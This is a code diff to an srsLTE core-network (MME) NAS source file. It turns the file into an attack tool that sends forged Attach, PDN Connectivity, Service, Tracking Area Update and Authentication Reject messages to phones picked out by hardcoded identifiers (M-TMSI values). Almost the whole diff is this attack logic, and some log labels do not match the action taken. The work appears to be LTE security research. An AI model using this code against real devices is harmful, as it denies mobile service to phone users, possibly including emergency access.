@@ -361,8 +361,7 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
   nas_ctx->m_emm_ctx.state = EMM_STATE_DEREGISTERED;
 
   // Save UE network capabilities
-  memcpy(
-      &nas_ctx->m_sec_ctx.ue_network_cap, &attach_req.ue_network_cap, sizeof(LIBLTE_MME_UE_NETWORK_CAPABILITY_STRUCT));
+  memcpy(&nas_ctx->m_sec_ctx.ue_network_cap, &attach_req.ue_network_cap, sizeof(LIBLTE_MME_UE_NETWORK_CAPABILITY_STRUCT));
   nas_ctx->m_sec_ctx.ms_network_cap_present = attach_req.ms_network_cap_present;
   if (attach_req.ms_network_cap_present) {
     memcpy(&nas_ctx->m_sec_ctx.ms_network_cap,
@@ -399,18 +398,10 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
   s1ap->add_nas_ctx_to_mme_ue_s1ap_id_map(nas_ctx);
   s1ap->add_ue_to_enb_set(enb_sri->sinfo_assoc_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id);
 
-  // Send Identity Request
-  // MODIFIED
-  /*
-  nas_log->console("Send Service Reject with EMM Cause No.7 instead of Identity Request\n");
-  nas_tx = pool->allocate();
-  nas_ctx->pack_service_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
-  s1ap->send_downlink_nas_transport(nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
-  pool->deallocate(nas_tx);
-  */
-
-  // MODIFIED
+  // MODIFIED - Attach Reject Attack
   // Pack Attach Reject in Downlink NAS Transport msg
+  /*
+  if (
   nas_tx = pool->allocate();
   nas_ctx->pack_attach_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
 
@@ -420,17 +411,26 @@ bool nas::handle_guti_attach_request_unknown_ue(uint32_t                        
 
   nas_log->info("Downlink NAS: Sending Attach Reject\n");
   nas_log->console("Downlink NAS: Sending Attach Reject\n");
-  return true;
- 
+  */
+  //return true;
 
-  /*
+  // MODIFIED - PDN Connectivity Reject Attack
+  uint32_t victim_m_tmsi = 0xd0247206;
+  nas_tx = pool->allocate();
+  nas_log->console("Authentication Reject Attack - Send Authentication Reject Message\n");
+  nas_ctx->pack_pdn_connectivity_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+  s1ap->send_downlink_nas_transport(nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
+  pool->deallocate(nas_tx);
+  return true;
+
+  // Send Identity Request
+  nas_tx = pool->allocate();
   nas_ctx->pack_identity_request(nas_tx);
   s1ap->send_downlink_nas_transport(
       nas_ctx->m_ecm_ctx.enb_ue_s1ap_id, nas_ctx->m_ecm_ctx.mme_ue_s1ap_id, nas_tx, nas_ctx->m_ecm_ctx.enb_sri);
   pool->deallocate(nas_tx);
 
   return true;
-  */
 }
 
 bool nas::handle_guti_attach_request_known_ue(nas*                                                  nas_ctx,
@@ -619,6 +619,22 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
   }
 
   uint64_t imsi = s1ap->find_imsi_from_m_tmsi(m_tmsi);
+
+  // MODIFIED - Service Reject Attack
+  uint32_t victim_m_tmsi = 0xc82a6fc4;
+  if (m_tmsi == victim_m_tmsi) {
+    nas_log->console("Sending Service Reject message to victim UE with EMM message No.7\n");
+    nas nas_tmp(args, itf, nas_log);
+    nas_tmp.m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
+    nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
+
+    srslte::byte_buffer_t* nas_tx = pool->allocate();
+    nas_tmp.pack_service_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
+    pool->deallocate(nas_tx);
+    return true;
+  }
+
   if (imsi == 0) {
     nas_log->console("Could not find IMSI from M-TMSI. M-TMSI 0x%x\n", m_tmsi);
     nas_log->error("Could not find IMSI from M-TMSI. M-TMSI 0x%x\n", m_tmsi);
@@ -633,7 +649,6 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
     return true;
   }
 
-  uint32_t victim_m_tmsi = 0xd02a0f8b;
   nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
   if (nas_ctx == NULL || nas_ctx->m_emm_ctx.state != EMM_STATE_REGISTERED) {
     nas_log->console("UE is not EMM-Registered.\n");
@@ -648,21 +663,6 @@ bool nas::handle_service_request(uint32_t                m_tmsi,
     pool->deallocate(nas_tx);
     return true;
   }
-  // MODIFIED
-  /*
-  else if (m_tmsi == victim_m_tmsi) {
-    nas_log->console("Sending Service Reject message to victim UE with EMM message No.7\n");
-    nas nas_tmp(args, itf, nas_log);
-    nas_tmp.m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
-    nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
-
-    srslte::byte_buffer_t* nas_tx = pool->allocate();
-    nas_tmp.pack_service_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
-    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
-    pool->deallocate(nas_tx);
-    return true;
-  }
-  */
 
   emm_ctx_t* emm_ctx = &nas_ctx->m_emm_ctx;
   ecm_ctx_t* ecm_ctx = &nas_ctx->m_ecm_ctx;
@@ -844,16 +844,15 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
   nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
 
   srslte::byte_buffer_t* nas_tx = pool->allocate();
-  // MODIFIED
+  // MODIFIED - TAU Reject Attack
   //nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
 
-  uint32_t victim_m_tmsi = 0xd02a0f8b;
+  uint32_t victim_m_tmsi = 0xd0215dee;
 
-  //nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
   if(m_tmsi == victim_m_tmsi) {
     nas_log->console("Victim's M-TMSI : 0x%x\n", victim_m_tmsi);
-    nas_log->console("Sending TAU Reject with EMM Message 7\n");
-    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.7
+    nas_log->console("Sending TAU Reject with EMM Message 10\n");
+    nas_tmp.pack_tracking_area_update_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED); // EMM Message No.10
     s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx, *enb_sri);
     pool->deallocate(nas_tx);
   }
@@ -894,7 +893,7 @@ bool nas::handle_attach_request(srslte::byte_buffer_t* nas_rx)
     m_nas_log->error("Error unpacking NAS PDN Connectivity Request. Error: %s\n", liblte_error_text[err]);
     return false;
   }
-
+  
   // Get UE IMSI
   if (attach_req.eps_mobile_id.type_of_id == LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI) {
     for (int i = 0; i <= 14; i++) {
@@ -910,6 +909,17 @@ bool nas::handle_attach_request(srslte::byte_buffer_t* nas_rx)
   } else {
     m_nas_log->error("Unhandled Mobile Id type in attach request\n");
     return false;
+  }
+
+  // MODIFIED - PDN Connectivity Reject Attack
+  uint32_t victim_m_tmsi = 0xd0247206;
+  if (m_tmsi == victim_m_tmsi) {
+    srslte::byte_buffer_t* nas_tx = m_pool->allocate();
+    m_nas_log->console("Authentication Reject Attack - Send Authentication Reject Message\n");
+    pack_pdn_connectivity_reject(nas_tx, LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+    m_s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx, m_ecm_ctx.enb_sri);
+    m_pool->deallocate(nas_tx);
+    return true;
   }
 
   // Is UE known?
@@ -1010,6 +1020,14 @@ bool nas::handle_authentication_response(srslte::byte_buffer_t* nas_rx)
   }
 
   nas_tx = m_pool->allocate();
+  // MODIFIED - Authentication Reject Attack
+  nas_tx = m_pool->allocate();
+  m_nas_log->console("Authentication Reject Attack - Send Authentication Reject Message\n");
+  pack_authentication_reject(nas_tx);
+  m_s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx, m_ecm_ctx.enb_sri);
+  m_pool->deallocate(nas_tx);
+  return true;
+
   if (!ue_valid) {
     // Authentication rejected
     m_nas_log->console("UE Authentication Rejected.\n");
@@ -1173,6 +1191,15 @@ bool nas::handle_identity_response(srslte::byte_buffer_t* nas_rx)
 
   m_nas_log->info("ID response -- IMSI: %015" PRIu64 "\n", imsi);
   m_nas_log->console("ID Response -- IMSI: %015" PRIu64 "\n", imsi);
+  // MODIFIED - Authentication Reject Attack
+  /*
+  nas_tx = m_pool->allocate();
+  m_nas_log->console("Authentication Reject Attack - Send Authentication Reject Message\n");
+  pack_authentication_reject(nas_tx);
+  m_s1ap->send_downlink_nas_transport(m_ecm_ctx.enb_ue_s1ap_id, m_ecm_ctx.mme_ue_s1ap_id, nas_tx, m_ecm_ctx.enb_sri);
+  m_pool->deallocate(nas_tx);
+  return true;
+  */
 
   // Set UE's IMSI
   m_emm_ctx.imsi = imsi;
@@ -1605,6 +1632,28 @@ bool nas::pack_identity_request(srslte::byte_buffer_t* nas_buffer)
   return true;
 }
 
+// MODIFIED
+bool nas::pack_pdn_connectivity_reject(srslte::byte_buffer_t* nas_buffer, uint8_t emm_cause)
+{
+  m_nas_log->console("Packing PDN Connectivity Reject\n");
+
+  LIBLTE_MME_PDN_CONNECTIVITY_REJECT_MSG_STRUCT pdn_rej;
+  pdn_rej.eps_bearer_id = 0;
+  pdn_rej.proc_transaction_id = 0;
+  pdn_rej.esm_cause = emm_cause;
+  pdn_rej.protocol_cnfg_opts_present = true;
+  pdn_rej.t3496_present = false;
+
+  LIBLTE_ERROR_ENUM err = liblte_mme_pack_pdn_connectivity_reject_msg(&pdn_rej, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
+
+  if (err != LIBLTE_SUCCESS) {
+    m_nas_log->error("Error packing PDN Reject\n");
+    m_nas_log->console("Error packing PDN Reject\n");
+  }
+
+  return true;
+}
+
 bool nas::pack_emm_information(srslte::byte_buffer_t* nas_buffer)
 {
   m_nas_log->info("Packing EMM Information\n");
@@ -1682,6 +1731,11 @@ bool nas::pack_tracking_area_update_reject(srslte::byte_buffer_t* nas_buffer, ui
     m_nas_log->console("Error packing Tracking Area Update Reject\n");
     return false;
   }
+  return true;
+}
+
+bool nas::pack_tracking_area_update_accept(srslte::byte_buffer_t* nas_buffer)
+{
   return true;
 }
 
